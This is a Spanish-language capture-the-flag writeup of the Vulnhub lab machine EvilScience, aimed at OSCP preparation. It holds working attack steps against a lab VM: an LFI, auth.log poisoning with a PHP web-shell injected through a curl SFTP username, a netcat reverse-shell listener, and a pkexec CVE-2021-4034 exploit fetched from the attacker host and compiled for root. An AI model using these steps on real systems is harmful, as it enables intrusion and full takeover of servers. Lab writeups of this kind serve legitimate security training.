---
title: EvilScience Writeup - Vulnhub
date: 2025-02-13
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, EvilScience, OSCP Prep, LFI, RCE]
image:
  path: /assets/img/commons/vulnhub/EvilScience/portada.png
---

Anterior [**OSCP Lab 4**](https://lvs3c.github.io/posts/OSCP-Lazysysadmin/)

¡Saludos!

`OSCP Lab 5`

En este writeup, realizaremos la máquina [**EvilScience**](https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **LFI** obteniendo lectura de archivo de logs.
- **Log Poisoning** convirtiendo `LFI a RCE`, ganando acceso al servidor.
- Y por último, **explotar CVE-2021-4034** para convertirnos en root y obtener las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
[sudo] password for lvs3c:
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.17     00:0c:29:16:91:fa       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.400 seconds (106.67 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.17
PING 10.11.12.17 (10.11.12.17) 56(84) bytes of data.
64 bytes from 10.11.12.17: icmp_seq=1 ttl=64 time=0.563 ms

--- 10.11.12.17 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.563/0.563/0.563/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.17 -oG nmap_ports

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 12:23 -03
Nmap scan report for 10.11.12.17
Host is up (0.0035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:16:91:FA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.75 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p22,80 -sCV 10.11.12.17 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 12:23 -03
Nmap scan report for 10.11.12.17
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
|   256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
|_  256 86:6c:7c:4b:04:7e:57:4f:68:16:a9:74:4c:0d:2f:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: The Ether
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:16:91:FA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.2p2`.
- Puerto `80` servidor `Apache httpd 2.4.18`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.17/
http://10.11.12.17/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.11.12.17], JQuery, Script, Title[The Ether]
```

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.17 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 12:25 -03
Nmap scan report for 10.11.12.17
Host is up (0.00089s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /images/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

No tenemos mucha información, vamos a verificar la web.

![web](/assets/img/commons/vulnhub/EvilScience/web.png){: .center-image }

Nos llama la atención, el parámetro `file` en la url cuando navegamos por el menu de la web, podemos estar ante un `LFI` ya que incluye los archivos php.

![file](/assets/img/commons/vulnhub/EvilScience/file.png){: .center-image }

#### Probamos LFI

- Tratamos de listar /etc/passwd - Sin éxito

![passwd](/assets/img/commons/vulnhub/EvilScience/passwd.png){: .center-image }

- Listamos algún binario del sistema como /bin/date - Éxito! Tenemos un LFI.

![date](/assets/img/commons/vulnhub/EvilScience/date.png){: .center-image }


## Explotación

---

Una vez idenfiticado el `LFI`{: .filepath}, lo debemos convertir a un `RCE`{: .filepath}, esto se puede realizar mediante `Log Poisoning`.

- Tenemos que comprobar qué archivo de log podemos leer y de ahí tratar de añadir código para generarnos la conexión. Estos archivos de log pueden ser `access.log` de `apache`{: .filepath} o `auth.log` de `ssh`{: .filepath}.

Pasamos la solicitud por `BurpSuite`.

Probamos `access.log`{: .filepath} de varias maneras.

```bash
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/www/logs/access.log
/var/log/access.log
```
 
Ninguna funcionó.

Probamos `auth.log`{: .filepath}.

![authlog](/assets/img/commons/vulnhub/EvilScience/authlog.png){: .center-image }

Funcionó! Ahora necesitamos `envenenar` el log para tener ejecución de comandos y poder enviarnos la reverse shell.

Primero vamos a comprobar si podemos agregar nuestro código en el archivo auth.log, usamos **ssh**:

```bash
ssh "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@10.11.12.17"
```

![A](/assets/img/commons/vulnhub/EvilScience/A.png){: .center-image }

Excelente, nuestro código se ve reflejado, con lo cual ahora debemos añadir código `php`{: .filepath} para poder tener ejecución de comandos.

En versiones viejas de SSH, bastaba con hacer: `ssh '<?php system($_GET["cmd"]); ?>'@IP_OBJETIVO`, esto ya no funciona.

Lo que hacemos es lo siguiente: `curl -u '<?php system($_GET["c"]);?>' sftp://IP_OBJETIVO`.

- `-u` significa user

Probamos:

```bash
❯ curl -u '<?php system($_GET["c"]);?>' sftp://10.11.12.17/
Enter host password for user '<?php system($_GET["c"])':
curl: (67) Authentication failure
```

Validamos si nuestra entrada existe y si podemos ejecutar código.

![rce](/assets/img/commons/vulnhub/EvilScience/rce.png){: .center-image }

Ya tenemos `RCE!`.

![id](/assets/img/commons/vulnhub/EvilScience/id.png){: .center-image }

Lanzamos la reverse shell e ingresamos al sistema.

![reverse](/assets/img/commons/vulnhub/EvilScience/reverse.png){: .center-image }

```bash
❯ sudo rlwrap nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.17] 39024
bash: cannot set terminal process group (1116): Inappropriate ioctl for device
bash: no job control in this shell
www-data@theEther:/var/www/html/theEther.com/public_html$ whoami
whoami
www-data
www-data@theEther:/var/www/html/theEther.com/public_html$
```

## Escalación de privilegios

---

Listamos los binarios `SUID`.

```bash
www-data@theEther:/tmp$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
/usr/sbin/pppd
/usr/bin/python2.7
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/bin/su
/bin/mount
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/ping
/bin/fusermount
www-data@theEther:/tmp$
```

Vamos a explotar el binario `pkexec` expuesto a la vulnerabilidad [**cve-2021-4034**](https://github.com/arthepsy/CVE-2021-4034).

Descargamos la poc, la compartimos con la máquina víctima, compilamos y ejecutamos, obtenemos acceso root.

```bash
www-data@theEther:/tmp$ wget 10.11.12.10/cve-2021-4034-poc.c
wget 10.11.12.10/cve-2021-4034-poc.c
--2025-02-13 10:09:27--  http://10.11.12.10/cve-2021-4034-poc.c
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1267 (1.2K) [text/x-csrc]
Saving to: 'cve-2021-4034-poc.c'

     0K .                                                     100%  275M=0s

2025-02-13 10:09:27 (275 MB/s) - 'cve-2021-4034-poc.c' saved [1267/1267]

www-data@theEther:/tmp$ gcc -pthread cve-2021-4034-poc.c -o poc -lcrypt                                                                                                              
gcc -pthread cve-2021-4034-poc.c -o poc -lcrypt
www-data@theEther:/tmp$
www-data@theEther:/tmp$ ./poc
./poc
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cd /root
ls
flag.png
```

Validamos la flag.

![flag](/assets/img/commons/vulnhub/EvilScience/flag.png){: .center-image }

Dicha flag no es la correcta. 

Analizamos la imagen con strings, desencriptamos la cadena en base64 y obtenemos la flag real.

```bash
❯ strings flag.png
flag: b2N0b2JlciAxLCAyMDE3LgpXZSBoYXZlIG9yIGZpcnN0IGJhdGNoIG9mIHZvbHVudGVlcnMgZm9yIHRoZSBnZW5vbWUgcHJvamVjdC4gVGhlIGdyb3VwIGxvb2tzIHByb21pc2luZywgd2UgaGF2ZSBoaWdoIGhvcGVzIGZvciB0aGlzIQoKT2N0b2JlciAzLCAyMDE3LgpUaGUgZmlyc3QgaHVtYW4gdGVzdCB3YXMgY29uZHVjdGVkLiBPdXIgc3VyZ2VvbnMgaGF2ZSBpbmplY3RlZCBhIGZlbWFsZSBzdWJqZWN0IHdpdGggdGhlIGZpcnN0IHN0cmFpbiBvZiBhIGJlbmlnbiB2aXJ1cy4gTm8gcmVhY3Rpb25zIGF0IHRoaXMgdGltZSBmcm9tIHRoaXMgcGF0aWVudC4KCk9jdG9iZXIgMywgMjAxNy4KU29tZXRoaW5nIGhhcyBnb25lIHdyb25nLiBBZnRlciBhIGZldyBob3VycyBvZiBpbmplY3Rpb24sIHRoZSBodW1hbiBzcGVjaW1lbiBhcHBlYXJzIHN5bXB0b21hdGljLCBleGhpYml0aW5nIGRlbWVudGlhLCBoYWxsdWNpbmF0aW9ucywgc3dlYXRpbmcsIGZvYW1pbmcgb2YgdGhlIG1vdXRoLCBhbmQgcmFwaWQgZ3Jvd3RoIG9mIGNhbmluZSB0ZWV0aCBhbmQgbmFpbHMuCgpPY3RvYmVyIDQsIDIwMTcuCk9ic2VydmluZyBvdGhlciBjYW5kaWRhdGVzIHJlYWN0IHRvIHRoZSBpbmplY3Rpb25zLiBUaGUgZXRoZXIgc2VlbXMgdG8gd29yayBmb3Igc29tZSBidXQgbm90IGZvciBvdGhlcnMuIEtlZXBpbmcgY2xvc2Ugb2JzZXJ2YXRpb24gb24gZmVtYWxlIHNwZWNpbWVuIG9uIE9jdG9iZXIgM3JkLgoKT2N0b2JlciA3LCAyMDE3LgpUaGUgZmlyc3QgZmxhdGxpbmUgb2YgdGhlIHNlcmllcyBvY2N1cnJlZC4gVGhlIGZlbWFsZSBzdWJqZWN0IHBhc3NlZC4gQWZ0ZXIgZGVjcmVhc2luZywgbXVzY2xlIGNvbnRyYWN0aW9ucyBhbmQgbGlmZS1saWtlIGJlaGF2aW9ycyBhcmUgc3RpbGwgdmlzaWJsZS4gVGhpcyBpcyBpbXBvc3NpYmxlISBTcGVjaW1lbiBoYXMgYmVlbiBtb3ZlZCB0byBhIGNvbnRhaW5tZW50IHF1YXJhbnRpbmUgZm9yIGZ1cnRoZXIgZXZhbHVhdGlvbi4KCk9jdG9iZXIgOCwgMjAxNy4KT3RoZXIgY2FuZGlkYXRlcyBhcmUgYmVnaW5uaW5nIHRvIGV4aGliaXQgc2ltaWxhciBzeW1wdG9tcyBhbmQgcGF0dGVybnMgYXMgZmVtYWxlIHNwZWNpbWVuLiBQbGFubmluZyB0byBtb3ZlIHRoZW0gdG8gcXVhcmFudGluZSBhcyB3ZWxsLgoKT2N0b2JlciAxMCwgMjAxNy4KSXNvbGF0ZWQgYW5kIGV4cG9zZWQgc3ViamVjdCBhcmUgZGVhZCwgY29sZCwgbW92aW5nLCBnbmFybGluZywgYW5kIGF0dHJhY3RlZCB0byBmbGVzaCBhbmQvb3IgYmxvb2QuIENhbm5pYmFsaXN0aWMtbGlrZSBiZWhhdmlvdXIgZGV0ZWN0ZWQuIEFuIGFudGlkb3RlL3ZhY2NpbmUgaGFzIGJlZW4gcHJvcG9zZWQuCgpPY3RvYmVyIDExLCAyMDE3LgpIdW5kcmVkcyBvZiBwZW9wbGUgaGF2ZSBiZWVuIGJ1cm5lZCBhbmQgYnVyaWVkIGR1ZSB0byB0aGUgc2lkZSBlZmZlY3RzIG9mIHRoZSBldGhlci4gVGhlIGJ1aWxkaW5nIHdpbGwgYmUgYnVybmVkIGFsb25nIHdpdGggdGhlIGV4cGVyaW1lbnRzIGNvbmR1Y3RlZCB0byBjb3ZlciB1cCB0aGUgc3RvcnkuCgpPY3RvYmVyIDEzLCAyMDE3LgpXZSBoYXZlIGRlY2lkZWQgdG8gc3RvcCBjb25kdWN0aW5nIHRoZXNlIGV4cGVyaW1lbnRzIGR1ZSB0byB0aGUgbGFjayBvZiBhbnRpZG90ZSBvciBldGhlci4gVGhlIG1haW4gcmVhc29uIGJlaW5nIHRoZSBudW1lcm91cyBkZWF0aCBkdWUgdG8gdGhlIHN1YmplY3RzIGRpc3BsYXlpbmcgZXh0cmVtZSByZWFjdGlvbnMgdGhlIHRoZSBlbmdpbmVlcmVkIHZpcnVzLiBObyBwdWJsaWMgYW5ub3VuY2VtZW50IGhhcyBiZWVuIGRlY2xhcmVkLiBUaGUgQ0RDIGhhcyBiZWVuIHN1c3BpY2lvdXMgb2Ygb3VyIHRlc3RpbmdzIGFuZCBhcmUgY29uc2lkZXJpbmcgbWFydGlhbCBsYXdzIGluIHRoZSBldmVudCBvZiBhbiBvdXRicmVhayB0byB0aGUgZ2VuZXJhbCBwb3B1bGF0aW9uLgoKLS1Eb2N1bWVudCBzY2hlZHVsZWQgdG8gYmUgc2hyZWRkZWQgb24gT2N0b2JlciAxNXRoIGFmdGVyIFBTQS4K

❯ echo "b2N0b2JlciAxLCAyMDE3LgpXZSBoYXZlIG9yIGZpcnN0IGJhdGNoIG9mIHZvbHVudGVlcnMgZm9yIHRoZSBnZW5vbWUgcHJvamVjdC4gVGhlIGdyb3VwIGxvb2tzIHByb21pc2luZywgd2UgaGF2ZSBoaWdoIGhvcGVzIGZvciB0aGlzIQoKT2N0b2JlciAzLCAyMDE3LgpUaGUgZmlyc3QgaHVtYW4gdGVzdCB3YXMgY29uZHVjdGVkLiBPdXIgc3VyZ2VvbnMgaGF2ZSBpbmplY3RlZCBhIGZlbWFsZSBzdWJqZWN0IHdpdGggdGhlIGZpcnN0IHN0cmFpbiBvZiBhIGJlbmlnbiB2aXJ1cy4gTm8gcmVhY3Rpb25zIGF0IHRoaXMgdGltZSBmcm9tIHRoaXMgcGF0aWVudC4KCk9jdG9iZXIgMywgMjAxNy4KU29tZXRoaW5nIGhhcyBnb25lIHdyb25nLiBBZnRlciBhIGZldyBob3VycyBvZiBpbmplY3Rpb24sIHRoZSBodW1hbiBzcGVjaW1lbiBhcHBlYXJzIHN5bXB0b21hdGljLCBleGhpYml0aW5nIGRlbWVudGlhLCBoYWxsdWNpbmF0aW9ucywgc3dlYXRpbmcsIGZvYW1pbmcgb2YgdGhlIG1vdXRoLCBhbmQgcmFwaWQgZ3Jvd3RoIG9mIGNhbmluZSB0ZWV0aCBhbmQgbmFpbHMuCgpPY3RvYmVyIDQsIDIwMTcuCk9ic2VydmluZyBvdGhlciBjYW5kaWRhdGVzIHJlYWN0IHRvIHRoZSBpbmplY3Rpb25zLiBUaGUgZXRoZXIgc2VlbXMgdG8gd29yayBmb3Igc29tZSBidXQgbm90IGZvciBvdGhlcnMuIEtlZXBpbmcgY2xvc2Ugb2JzZXJ2YXRpb24gb24gZmVtYWxlIHNwZWNpbWVuIG9uIE9jdG9iZXIgM3JkLgoKT2N0b2JlciA3LCAyMDE3LgpUaGUgZmlyc3QgZmxhdGxpbmUgb2YgdGhlIHNlcmllcyBvY2N1cnJlZC4gVGhlIGZlbWFsZSBzdWJqZWN0IHBhc3NlZC4gQWZ0ZXIgZGVjcmVhc2luZywgbXVzY2xlIGNvbnRyYWN0aW9ucyBhbmQgbGlmZS1saWtlIGJlaGF2aW9ycyBhcmUgc3RpbGwgdmlzaWJsZS4gVGhpcyBpcyBpbXBvc3NpYmxlISBTcGVjaW1lbiBoYXMgYmVlbiBtb3ZlZCB0byBhIGNvbnRhaW5tZW50IHF1YXJhbnRpbmUgZm9yIGZ1cnRoZXIgZXZhbHVhdGlvbi4KCk9jdG9iZXIgOCwgMjAxNy4KT3RoZXIgY2FuZGlkYXRlcyBhcmUgYmVnaW5uaW5nIHRvIGV4aGliaXQgc2ltaWxhciBzeW1wdG9tcyBhbmQgcGF0dGVybnMgYXMgZmVtYWxlIHNwZWNpbWVuLiBQbGFubmluZyB0byBtb3ZlIHRoZW0gdG8gcXVhcmFudGluZSBhcyB3ZWxsLgoKT2N0b2JlciAxMCwgMjAxNy4KSXNvbGF0ZWQgYW5kIGV4cG9zZWQgc3ViamVjdCBhcmUgZGVhZCwgY29sZCwgbW92aW5nLCBnbmFybGluZywgYW5kIGF0dHJhY3RlZCB0byBmbGVzaCBhbmQvb3IgYmxvb2QuIENhbm5pYmFsaXN0aWMtbGlrZSBiZWhhdmlvdXIgZGV0ZWN0ZWQuIEFuIGFudGlkb3RlL3ZhY2NpbmUgaGFzIGJlZW4gcHJvcG9zZWQuCgpPY3RvYmVyIDExLCAyMDE3LgpIdW5kcmVkcyBvZiBwZW9wbGUgaGF2ZSBiZWVuIGJ1cm5lZCBhbmQgYnVyaWVkIGR1ZSB0byB0aGUgc2lkZSBlZmZlY3RzIG9mIHRoZSBldGhlci4gVGhlIGJ1aWxkaW5nIHdpbGwgYmUgYnVybmVkIGFsb25nIHdpdGggdGhlIGV4cGVyaW1lbnRzIGNvbmR1Y3RlZCB0byBjb3ZlciB1cCB0aGUgc3RvcnkuCgpPY3RvYmVyIDEzLCAyMDE3LgpXZSBoYXZlIGRlY2lkZWQgdG8gc3RvcCBjb25kdWN0aW5nIHRoZXNlIGV4cGVyaW1lbnRzIGR1ZSB0byB0aGUgbGFjayBvZiBhbnRpZG90ZSBvciBldGhlci4gVGhlIG1haW4gcmVhc29uIGJlaW5nIHRoZSBudW1lcm91cyBkZWF0aCBkdWUgdG8gdGhlIHN1YmplY3RzIGRpc3BsYXlpbmcgZXh0cmVtZSByZWFjdGlvbnMgdGhlIHRoZSBlbmdpbmVlcmVkIHZpcnVzLiBObyBwdWJsaWMgYW5ub3VuY2VtZW50IGhhcyBiZWVuIGRlY2xhcmVkLiBUaGUgQ0RDIGhhcyBiZWVuIHN1c3BpY2lvdXMgb2Ygb3VyIHRlc3RpbmdzIGFuZCBhcmUgY29uc2lkZXJpbmcgbWFydGlhbCBsYXdzIGluIHRoZSBldmVudCBvZiBhbiBvdXRicmVhayB0byB0aGUgZ2VuZXJhbCBwb3B1bGF0aW9uLgoKLS1Eb2N1bWVudCBzY2hlZHVsZWQgdG8gYmUgc2hyZWRkZWQgb24gT2N0b2JlciAxNXRoIGFmdGVyIFBTQS4K" | base64 -d; echo

october 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.
```

Hope it helps!